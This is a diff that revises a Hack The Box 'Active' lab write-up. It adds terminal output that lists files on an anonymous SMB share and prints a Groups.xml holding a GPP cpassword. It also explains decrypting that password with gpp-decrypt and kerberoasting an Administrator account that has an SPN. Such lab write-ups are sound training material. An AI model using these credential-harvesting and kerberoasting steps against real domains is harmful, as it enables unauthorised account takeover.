@@ -77,9 +77,20 @@ SMB         10.10.10.100    445    DC               SYSVOL                      
 SMB         10.10.10.100    445    DC               Users
 ```
 
-It was a non-default share so I looked into the files and found some interesting information related to GPP. 
+It was a non-default share so I looked into the files and found some interesting information related to GPP in the file `active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml` . 
 
 ```jsx
+┌─[noob@parrot]─[~/htb/active/anon_smb]
+└──╼ $find . -type f 
+./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
+./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
+./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
+./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
+./active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
+./active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
+┌─[noob@parrot]─[~/htb/active/anon_smb]
+└──╼ $cat active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
 </Groups>
@@ -87,11 +98,11 @@ It was a non-default share so I looked into the files and found some interesting
 
 ### Group Policy Preferences
 
-It provides useful capability to leverage Group Policy to “deploy” scheduled tasks with explicit credentials and change the local admin passwords on large numbers of computers at once – probably the two most popular usage scenario.
+It provides the useful capability to leverage Group Policy to “deploy” `scheduled tasks with explicit credentials` and change the local admin passwords on large numbers of computers at once – probably the two most popular usage scenarios.
 
-One of the most useful features of Group Policy Preferences (GPP) is the ability to store and use credentials in several scenarios. These include: Map drives (Drives.xml), Create Local Users, Data Sources (DataSources.xml), Printer configuration (Printers.xml), Create/Update Services (Services.xml), Scheduled Tasks (ScheduledTasks.xml), Change local Administrator passwords, etc.
+One of the most useful features of Group Policy Preferences (GPP) is the ability to `store and use credentials in several scenarios.` These include: Map drives (Drives.xml), Create Local Users, Data Sources (DataSources.xml), Printer configuration (Printers.xml), Create/Update Services (Services.xml), Scheduled Tasks (ScheduledTasks.xml), Change local Administrator passwords, etc.
 
-When a new GPP (Group Policy Preference) is created, a corresponding XML file is generated to store the relevant configuration data. If a password is present, it is encrypted using AES-256 bit encryption. Within the XML file, the `cpassword` field contains the encrypted password. However, in approximately 2012, Microsoft released the AES private key, which made it relatively easy to crack the password. [link](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
+When a new GPP (Group Policy Preference) is created, a corresponding `XML file is generated to store the relevant configuration data`. If a password is present, it is encrypted using `AES-256-bit encryption`. Within the XML file, the `cpassword` field contains the encrypted password. However, in around 2012, Microsoft released the `AES private key`, which made it relatively easy to decrypt the password. [link](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
 
 The tool gpp-decrypt automates the process for us and we can get the password from the encrypted text.
 
@@ -129,9 +140,9 @@ Normally, If we don’t have shell on the machine but credentials we can go for 
 
 ```
 
-While looking at user accounts our attention went to the fact that administrator account has `ServicePrincipalName` as not null. 
+While looking at user accounts our attention went to the fact that the administrator account has `ServicePrincipalName` as not null. 
 
-We know that a domain account is being used as a service if the `SPN` is not null. The goal of `kerberoasting` is to harvest `TGS` tickets of services that run on behalf of user accounts. And we know that some part of the ticket are encrypted with keys derived from user passwords. Thus we can crack them offline. 
+We know that a domain account is being used as a service if the `SPN` is not null. The goal of `kerberoasting` is to harvest `TGS` tickets of services that run on behalf of user accounts. And we know that some parts of the ticket are encrypted with keys derived from user passwords. Thus we can crack them offline. 
 
 ```jsx
 # Administrator, Users, active.htb
@@ -171,7 +182,7 @@ accountExpires: 0
 logonCount: 64
 sAMAccountName: Administrator
 sAMAccountType: 805306368
-servicePrincipalName: active/CIFS:445
+**servicePrincipalName: active/CIFS:445**
 objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb
 isCriticalSystemObject: TRUE
 dSCorePropagationData: 20180718203435.0Z
@@ -183,7 +194,7 @@ lastLogonTimestamp: 133421175484525035
 msDS-SupportedEncryptionTypes: 0
 ```
 
-Here we can see that administrator account is vulnerable to kerberoasting. We can use `impackets`  `GetUserSPN.py` to request `TGS` ticket. Then we can crack the password offline to get credentials for administrator.
+Here we can see that the administrator account is vulnerable to kerberoasting. We can use `impackets`  `GetUserSPN.py` to request `TGS` ticket. Then we can crack the password offline to get credentials for the administrator.
 
 ```jsx
 ┌─[noob@parrot]─[~/htb/active/svc_tgs_smb]
